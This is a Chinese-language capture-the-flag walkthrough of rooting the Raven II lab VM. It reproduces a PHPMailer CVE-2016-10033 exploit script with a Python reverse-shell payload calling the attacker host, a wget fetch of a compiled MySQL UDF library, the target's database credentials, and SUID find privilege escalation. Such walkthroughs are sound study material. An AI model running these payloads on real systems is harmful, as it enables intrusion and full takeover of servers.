```http
https://blog.csdn.net/qq_60115503/article/details/124336739
```

# 信息搜集

1、主机发现

```bash
arp-scan -l 
```

2、端口扫描

```
nmap -sV -A 192.168.0.102
```

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-29 23:53 EDT
Nmap scan report for 192.168.0.102 (192.168.0.102)
Host is up (0.00047s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 2681c1f35e01ef93493d911eae8b3cfc (DSA)
|   2048 315801194da280a6b90d40981c97aa53 (RSA)
|   256 1f773119deb0e16dca77077684d3a9a0 (ECDSA)
|_  256 0e8571a8a2c308699c91c03f8418dfae (ED25519)
80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Raven Security
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          37070/udp6  status
|   100024  1          47791/tcp   status
|   100024  1          55426/tcp6  status
|_  100024  1          56142/udp   status
MAC Address: 00:0C:29:3D:F8:47 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

3、80端口web上下文枚举

```bash
gobuster dir -u http://192.168.0.102 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,js,php.bak,txt.bak,html.bak,json,git,git.bak
```

```
/.html                (Status: 403) [Size: 293]
/.html.bak            (Status: 403) [Size: 297]
/index.html           (Status: 200) [Size: 16819]
/.php                 (Status: 403) [Size: 292]
/about.html           (Status: 200) [Size: 13265]
/img                  (Status: 301) [Size: 312] [--> http://192.168.0.102/img/]
/contact.php          (Status: 200) [Size: 9699]
/service.html         (Status: 200) [Size: 11114]
/css                  (Status: 301) [Size: 312] [--> http://192.168.0.102/css/]
/wordpress            (Status: 301) [Size: 318] [--> http://192.168.0.102/wordpress/]
/team.html            (Status: 200) [Size: 15449]
/manual               (Status: 301) [Size: 315] [--> http://192.168.0.102/manual/]
/js                   (Status: 301) [Size: 311] [--> http://192.168.0.102/js/]
/vendor               (Status: 301) [Size: 315] [--> http://192.168.0.102/vendor/]
/elements.html        (Status: 200) [Size: 35226]
/fonts                (Status: 301) [Size: 314] [--> http://192.168.0.102/fonts/]
```

发现了重点路径 `/vendor`

4、查看 `http://192.168.0.102/vendor/`

<img src=".\图片\Snipaste_2023-05-30_12-17-58.png" alt="Snipaste_2023-05-30_12-17-58" style="zoom:80%;" />

5、查看 `README.md`

<img src=".\图片\Snipaste_2023-05-30_12-21-49.png" alt="Snipaste_2023-05-30_12-21-49" style="zoom: 67%;" />

发现靶机存在 `phpMailer` 邮件服务,且版本为 `5.2.14`

5、寻找 phpMailer 相关版本的漏洞

```bash
└─# searchsploit phpMailer
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                              |  Path
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
PHPMailer 1.7 - 'Data()' Remote Denial of Service                                                                           | php/dos/25752.txt
PHPMailer < 5.2.18 - Remote Code Execution                                                                                  | php/webapps/40968.sh
PHPMailer < 5.2.18 - Remote Code Execution                                                                                  | php/webapps/40970.php
PHPMailer < 5.2.18 - Remote Code Execution                                                                                  | php/webapps/40974.py
PHPMailer < 5.2.19 - Sendmail Argument Injection (Metasploit)                                                               | multiple/webapps/41688.rb
PHPMailer < 5.2.20 - Remote Code Execution                                                                                  | php/webapps/40969.py
PHPMailer < 5.2.20 / SwiftMailer < 5.4.5-DEV / Zend Framework / zend-mail < 2.4.11 - 'AIO' 'PwnScriptum' Remote Code Execut | php/webapps/40986.py
PHPMailer < 5.2.20 with Exim MTA - Remote Code Execution                                                                    | php/webapps/42221.py
PHPMailer < 5.2.21 - Local File Disclosure                                                                                  | php/webapps/43056.py
WordPress Plugin PHPMailer 4.6 - Host Header Command Injection (Metasploit)                                                 | php/remote/42024.rb
```

# PHPMailer漏洞利用

```bash
┌──(root💀kali)-[~]
└─# locate php/webapps/40974.py
/usr/share/exploitdb/exploits/php/webapps/40974.py
                                                                                                                                                              
┌──(root💀kali)-[~]
└─# cp /usr/share/exploitdb/exploits/php/webapps/40974.py 40974.py             
                                                                                                                                                              
┌──(root💀kali)-[~]
└─# ls                         
40974.py  CrackMapExec  Desktop  Documents  Downloads  Music  Pictures  Public  redis-stable  redis-stable.tar.gz  Templates  Videos
```

```bash
┌──(root💀kali)-[~]
└─# cat 40974.py                                                  
"""
# Exploit Title: PHPMailer Exploit v1.0
# Date: 29/12/2016
# Exploit Author: Daniel aka anarc0der
# Version: PHPMailer < 5.2.18
# Tested on: Arch Linux
# CVE : CVE 2016-10033

Description:
Exploiting PHPMail with back connection (reverse shell) from the target

Usage:
1 - Download docker vulnerable enviroment at: https://github.com/opsxcq/exploit-CVE-2016-10033
2 - Config your IP for reverse shell on payload variable
4 - Open nc listener in one terminal: $ nc -lnvp <your ip>
3 - Open other terminal and run the exploit: python3 anarcoder.py

Video PoC: https://www.youtube.com/watch?v=DXeZxKr-qsU

Full Advisory:
https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html
"""

from requests_toolbelt import MultipartEncoder
import requests
import os
import base64
from lxml import html as lh

os.system('clear')
print("\n")
print(" █████╗ ███╗   ██╗ █████╗ ██████╗  ██████╗ ██████╗ ██████╗ ███████╗██████╗ ")
print("██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗")
print("███████║██╔██╗ ██║███████║██████╔╝██║     ██║   ██║██║  ██║█████╗  ██████╔╝")
print("██╔══██║██║╚██╗██║██╔══██║██╔══██╗██║     ██║   ██║██║  ██║██╔══╝  ██╔══██╗")
print("██║  ██║██║ ╚████║██║  ██║██║  ██║╚██████╗╚██████╔╝██████╔╝███████╗██║  ██║")
print("╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝")
print("      PHPMailer Exploit CVE 2016-10033 - anarcoder at protonmail.com")
print(" Version 1.0 - github.com/anarcoder - greetings opsxcq & David Golunski\n")

target = 'http://localhost:8080'
backdoor = '/backdoor.php'

payload = '<?php system(\'python -c """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\'192.168.0.12\\\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])"""\'); ?>'
fields={'action': 'submit',
        'name': payload,
        'email': '"anarcoder\\\" -OQueueDirectory=/tmp -X/www/backdoor.php server\" @protonmail.com',
        'message': 'Pwned'}

m = MultipartEncoder(fields=fields,
                     boundary='----WebKitFormBoundaryzXJpHSq4mNy35tHe')

headers={'User-Agent': 'curl/7.47.0',
         'Content-Type': m.content_type}

proxies = {'http': 'localhost:8081', 'https':'localhost:8081'}


print('[+] SeNdiNG eVIl SHeLL To TaRGeT....')
r = requests.post(target, data=m.to_string(),
                  headers=headers)
print('[+] SPaWNiNG eVIL sHeLL..... bOOOOM :D')
r = requests.get(target+backdoor, headers=headers)
if r.status_code == 200:
    print('[+]  ExPLoITeD ' + target)                                                                       
```

修改 exp 如下：

```bash
└─# cat 40974.py

#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
# Exploit Title: PHPMailer Exploit v1.0
# Date: 29/12/2016
# Exploit Author: Daniel aka anarc0der
# Version: PHPMailer < 5.2.18
# Tested on: Arch Linux
# CVE : CVE 2016-10033

Description:
Exploiting PHPMail with back connection (reverse shell) from the target

Usage:
1 - Download docker vulnerable enviroment at: https://github.com/opsxcq/exploit-CVE-2016-10033
2 - Config your IP for reverse shell on payload variable
4 - Open nc listener in one terminal: $ nc -lnvp <your ip>
3 - Open other terminal and run the exploit: python3 anarcoder.py

Video PoC: https://www.youtube.com/watch?v=DXeZxKr-qsU

Full Advisory:
https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html
"""

from requests_toolbelt import MultipartEncoder
import requests
import os
import base64
from lxml import html as lh

os.system('clear')
print("\n")
print(" █████╗ ███╗   ██╗ █████╗ ██████╗  ██████╗ ██████╗ ██████╗ ███████╗██████╗ ")
print("██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗")
print("███████║██╔██╗ ██║███████║██████╔╝██║     ██║   ██║██║  ██║█████╗  ██████╔╝")
print("██╔══██║██║╚██╗██║██╔══██║██╔══██╗██║     ██║   ██║██║  ██║██╔══╝  ██╔══██╗")
print("██║  ██║██║ ╚████║██║  ██║██║  ██║╚██████╗╚██████╔╝██████╔╝███████╗██║  ██║")
print("╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝")
print("      PHPMailer Exploit CVE 2016-10033 - anarcoder at protonmail.com")
print(" Version 1.0 - github.com/anarcoder - greetings opsxcq & David Golunski\n")

target = 'http://192.168.0.102/contact.php'
backdoor = '/zf1yolo.php'

payload = '<?php system(\'python -c """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\'192.168.0.103\\\',6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])"""\'); ?>'
fields={'action': 'submit',
        'name': payload,
        'email': '"anarcoder\\\" -OQueueDirectory=/tmp -X/var/www/html/zf1yolo.php server\" @protonmail.com',
        'message': 'Pwned'}

m = MultipartEncoder(fields=fields,
                     boundary='----WebKitFormBoundaryzXJpHSq4mNy35tHe')

headers={'User-Agent': 'curl/7.47.0',
         'Content-Type': m.content_type}

proxies = {'http': 'localhost:8081', 'https':'localhost:8081'}


print('[+] SeNdiNG eVIl SHeLL To TaRGeT....')
r = requests.post(target, data=m.to_string(),
                  headers=headers)
print('[+] SPaWNiNG eVIL sHeLL..... bOOOOM :D')
r = requests.get(target+backdoor, headers=headers)
if r.status_code == 200:
    print('[+]  ExPLoITeD ' + target)
```

运行 exp

```bash
└─# python 40974.py
```

触发访问：

```http
http://192.168.0.102/zf1yolo.php
```

kali 得到反弹 shell

```bash
└─# nc -lvnp 6666            
listening on [any] 6666 ...
connect to [192.168.0.103] from (UNKNOWN) [192.168.0.102] 39591
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```

交互shell

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

```bash
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@Raven:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@Raven:/var/www/html$ ls
ls
Security - Doc  contact.zip    fonts       js            team.html  zf1yolo.php
about.html      css            img         scss          vendor
contact.php     elements.html  index.html  service.html  wordpress
www-data@Raven:/var/www/html$ 
```

寻找 flag

```bash
find / -name "flag*"
```

```bash
www-data@Raven:/var/www/html$ cat /var/www/flag2.txt
cat /var/www/flag2.txt
flag2{6a8ed560f0b5358ecf844108048eb337}
```

# 提权

## 信息搜集

1、查看网站配置文件

```bash
www-data@Raven:/var/www/html/wordpress$ cat wp-config.php
cat wp-config.php

<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'R@v3nSecurity');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         '0&ItXmn^q2d[e*yB:9,L:rR<B`h+DG,zQ&SN{Or3zalh.JE+Q!Gi:L7U[(T:J5ay');
define('SECURE_AUTH_KEY',  'y@^[*q{)NKZAKK{,AA4y-Ia*swA6/O@&*r{+RS*N!p1&a$*ctt+ I/!?A/Tip(BG');
define('LOGGED_IN_KEY',    '.D4}RE4rW2C@9^Bp%#U6i)?cs7,@e]YD:R~fp#hXOk$4o/yDO8b7I&/F7SBSLPlj');
define('NONCE_KEY',        '4L{Cq,%ce2?RRT7zue#R3DezpNq4sFvcCzF@zdmgL/fKpaGX:EpJt/]xZW1_H&46');
define('AUTH_SALT',        '@@?u*YKtt:o/T&V;cbb`.GaJ0./S@dn$t2~n+lR3{PktK]2,*y/b%<BH-Bd#I}oE');
define('SECURE_AUTH_SALT', 'f0Dc#lKmEJi(:-3+x.V#]Wy@mCmp%njtmFb6`_80[8FK,ZQ=+HH/$& mn=]=/cvd');
define('LOGGED_IN_SALT',   '}STRHqy,4scy7v >-..Hc WD*h7rnYq]H`-glDfTVUaOwlh!-/?=3u;##:Rj1]7@');
define('NONCE_SALT',       'i(#~[sXA TbJJfdn&D;0bd`p$r,~.o/?%m<H+<>Vj+,nLvX!-jjjV-o6*HDh5Td{');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
        define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
```

发现 mysql 的账号密码

`root:R@v3nSecurity`

## UDF提权

1、登录mysql

<img src=".\图片\Snipaste_2023-05-30_13-09-41.png" alt="Snipaste_2023-05-30_13-09-41" style="zoom:80%;" />

2、查看plugin目录

```sql
show global variables like 'plugin%';
```

```sql
+---------------+------------------------+
| Variable_name | Value                  |
+---------------+------------------------+
| plugin_dir    | /usr/lib/mysql/plugin/ |
+---------------+------------------------+
```

目录没有问题可以进行上传UDF

3、查看导入的目录

```sql
mysql> show global variables like 'secure%';
show global variables like 'secure%';
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_auth      | OFF   |
| secure_file_priv |       |
+------------------+-------+
```

secure_file_priv 是空目录可以进行任何地方的导入 

4、searchsploit搜索漏洞

```bash
└─# searchsploit mysql udf
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                              |  Path
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
MySQL 4.0.17 (Linux) - User-Defined Function (UDF) Dynamic Library (1)                                                      | linux/local/1181.c
MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)                                                     | linux/local/1518.c
MySQL 4.x/5.0 (Windows) - User-Defined Function Command Execution                                                           | windows/remote/3274.txt
MySQL 4/5/6 - UDF for Command Execution                                                                                     | linux/local/7856.txt
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                                                                              
┌──(root💀kali)-[~]
└─# locate linux/local/1518.c                    
/usr/share/exploitdb/exploits/linux/local/1518.c
                                                                                                                                                              
┌──(root💀kali)-[~]
└─# cp /usr/share/exploitdb/exploits/linux/local/1518.c 1518.c  
```

5、编译成so文件

```bash
gcc -g -c 1518.c
gcc -g -shared -o lyqdjx.so 1518.o -lc
```

6、靶机下载kali里的lyqdjx.so文件

```bash
www-data@Raven:/var/www/html/wordpress$ cd /tmp
cd /tmp
www-data@Raven:/tmp$ wget http://192.168.0.103:7777/lyqdjx.so
```

7、靶机进入mysql数据库

```sql
mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| wordpress          |
+--------------------+
4 rows in set (0.00 sec)

mysql> use mysql;
use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

8、创建一个表

```sql
mysql> ccreate table zf1yolo(line blob);
create table zf1yolo(line blob);
Query OK, 0 rows affected (0.00 sec)
```

9、

添加字段数值，添加的我们上传到靶机的payload

```sql
mysql> insert into zf1yolo values(load_file('/tmp/lyqdjx.so'));
insert into zf1yolo values(load_file('/tmp/lyqdjx.so'));
Query OK, 1 row affected (0.00 sec)
```

将 zf1yolo 表中的所有内如导入到 /usr/lib/mysql/plugin

```sql
mysql> select * from zf1yolo into dumpfile '/usr/lib/mysql/plugin/lyqdjx.so';
select * from zf1yolo into dumpfile '/usr/lib/mysql/plugin/lyqdjx.so';
Query OK, 1 row affected (0.00 sec)
```

创建自定义函数

```sql
mysql> create function do_system returns integer soname 'lyqdjx.so';
create function do_system returns integer soname 'lyqdjx.so';
Query OK, 0 rows affected (0.00 sec)
```

通过审计 1518.c 我们知道使用的是 do_system 函数可以以root权限执行命令， 函数通过 do_system find命令所有者的suid权限，使其可以执行root权限命令(创建具有suid权限命令，方便提权)

```sql
mysql> select do_system('chmod u+s /usr/bin/find');
select do_system('chmod u+s /usr/bin/find');
+--------------------------------------+
| do_system('chmod u+s /usr/bin/find') |
+--------------------------------------+
|                                    0 |
+--------------------------------------+
1 row in set (0.01 sec)
```

10、find 提权

[(150条消息) 小记 SUID find提权_Crispr-bupt的博客-CSDN博客](https://blog.csdn.net/crisprx/article/details/104110725)

```bash
touch getshell
find / -type f -name getshell -exec "whoami" \;
find / -type f -name getshell -exec "/bin/sh" \;
```

# Flag

```bahs
# whoami
whoami
root
# cd /root
cd /root
# ls
ls
flag4.txt
# cat flag4.txt
cat flag4.txt
  ___                   ___ ___ 
 | _ \__ ___ _____ _ _ |_ _|_ _|
 |   / _` \ V / -_) ' \ | | | | 
 |_|_\__,_|\_/\___|_||_|___|___|
                           
flag4{df2bc5e951d91581467bb9a2a8ff4425}

CONGRATULATIONS on successfully rooting RavenII

I hope you enjoyed this second interation of the Raven VM

Hit me up on Twitter and let me know what you thought: 
```

<img src=".\图片\Snipaste_2023-05-30_13-45-36.png" alt="Snipaste_2023-05-30_13-45-36" style="zoom:80%;" />





























































































































































































































































